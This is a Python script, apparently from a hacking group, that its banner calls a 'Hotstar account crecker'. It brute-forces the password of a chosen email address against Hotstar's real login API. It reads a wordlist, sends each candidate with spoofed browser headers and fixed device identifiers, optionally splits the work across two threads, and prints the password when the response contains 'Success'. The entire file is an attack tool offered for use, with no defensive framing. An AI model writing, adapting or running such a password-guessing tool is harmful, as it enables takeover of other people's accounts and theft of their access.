#!/usr/bin/python
# -*- encoding: utf-8 -*-

import re
import sys
import threading

import requests

output = ""
usetor = False
banner = """

      ___           ___                       ___                       ___           ___     
     /__/\         /  /\          ___        /  /\          ___        /  /\         /  /\    
     \  \:\       /  /::\        /  /\      /  /:/_        /  /\      /  /::\       /  /::\   
      \__\:\     /  /:/\:\      /  /:/     /  /:/ /\      /  /:/     /  /:/\:\     /  /:/\:\  
  ___ /  /::\   /  /:/  \:\    /  /:/     /  /:/ /::\    /  /:/     /  /:/~/::\   /  /:/~/:/  
 /__/\  /:/\:\ /__/:/ \__\:\  /  /::\    /__/:/ /:/\:\  /  /::\    /__/:/ /:/\:\ /__/:/ /:/___
 \  \:\/:/__\/ \  \:\ /  /:/ /__/:/\:\   \  \:\/:/~/:/ /__/:/\:\   \  \:\/:/__\/ \  \:\/:::::/
  \  \::/       \  \:\  /:/  \__\/  \:\   \  \::/ /:/  \__\/  \:\   \  \::/       \  \::/~~~~ 
   \  \:\        \  \:\/:/        \  \:\   \__\/ /:/        \  \:\   \  \:\        \  \:\     
    \  \:\        \  \::/          \__\/     /__/:/          \__\/    \  \:\        \  \:\    
     \__\/         \__\/                     \__\/                     \__\/         \__\/    

                                                            Hotstar account crecker
                                                            coded by script1337
                                                            https://www.facebook.com/script1337
                                                            https://github.com/ScRiPt1337
            we are : mr black hex , invisible , script1337
"""

print(banner)
username = ""
x = 0
def login(password):
    global username
    url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
    headers = {
        'Host': 'api.hotstar.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'https://www.hotstar.com/in',
        'content-type': 'application/json',
        'origin': 'https://www.hotstar.com',
        'Content-Length': '231',
        'Connection': 'close'
    }

    password = password.replace("\n", "")
    data = r'{"isProfileRequired":false,"userData":{"deviceId":"6b74bbb5-0f3e-4bca-aa14-99a8a01ae377","pId":"f02695d92cf54d158f2ba8f524c8f222","password":"' + password + '","username":"' + username + '","usertype":"email"},"verification":{}}'
    response = requests.post(url, data=data, headers=headers)
    zx = findWholeWord('Success')(response.content)
    if zx:
        print("Password found : " + password + "\n")
        print("combo : " + username + ":" + password)
        sys.exit()
        #f = open(output, "a+")
        #f.write("email:" + email + " pass:" + password + "\n")


def findWholeWord(w):
    return re.compile(r'\b({0})\b'.format(w), flags=re.IGNORECASE).search


def runner(Lines):
    global x
    for line in Lines:
        try:
            x = x + 1
            print str(x) + " > tring... " + line.replace("\n", "")
            login(line)
        except:
            pass


def slowrun(combo):
    global x
    combo = open(combo, "r")
    file_content = combo.readlines()
    for lines in file_content:
        x = x + 1
        print str(x) + " > tring... " + lines.replace("\n", "")
        password = lines
        login(password)

def fireupthread(combo):
    user1 = []
    user2 = []
    combo = open(combo,"r")
    file_content = combo.readlines()
    for lines in file_content[:len(file_content)/2]:
        user1.append(lines)
    for lines in file_content[len(file_content)/2:]:
        user2.append(lines)
    try:
        t1 = threading.Thread(target=runner, args=[user1])
        t2 = threading.Thread(target=runner, args=[user2])
    except:
        print "Error: unable to start thread"
    t1.start()
    t2.start()
    t1.join()
    t2.join()

def main():
    global output
    global username
    argx = len(sys.argv)
    if argx < 3:
        print("example : python script.py example@gmail.com /example/wordlist.txt")
        print("example with threads : python script.py example@gmail.com /example/wordlist.txt thread")
        sys.exit()
    username = sys.argv[1]
    print "Target account > " + username + "\n"
    combo = sys.argv[2]
    if argx == 4:
        thread = sys.argv[3]
        if thread == "thread" or thread == "--thread":
            print ("\nLets Fire up some threads baby :)\n")
            fireupthread(combo)
        else:
            slowrun(combo)
    else:
        slowrun(combo)

main()
